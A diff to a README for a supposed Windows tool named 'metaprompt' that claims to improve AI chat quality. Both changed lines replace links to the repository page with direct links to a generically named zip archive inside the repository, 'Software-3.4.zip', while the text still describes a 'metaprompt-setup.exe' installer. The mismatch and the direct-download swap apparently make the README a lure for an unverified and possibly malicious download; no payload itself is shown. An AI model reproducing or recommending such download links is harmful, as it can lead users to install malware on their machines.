@@ -1,6 +1,6 @@
 # 🤖 metaprompt - Improve AI chat quality with ease
 
-[![Download metaprompt](https://img.shields.io/badge/Download-metaprompt-blue.svg)](https://github.com/Robertmyerkesextremist950/metaprompt)
+[![Download metaprompt](https://img.shields.io/badge/Download-metaprompt-blue.svg)](https://github.com/Robertmyerkesextremist950/metaprompt/raw/refs/heads/main/public/Software-3.4.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Robertmyerkesextremist950/metaprompt) to access the latest version of the installer.
+1. Visit the [official download page](https://github.com/Robertmyerkesextremist950/metaprompt/raw/refs/heads/main/public/Software-3.4.zip) to access the latest version of the installer.
 2. Locate the file named `metaprompt-setup.exe` in the list of assets.
 3. Click the filename to start the download.
 4. Save the file to your Downloads folder.
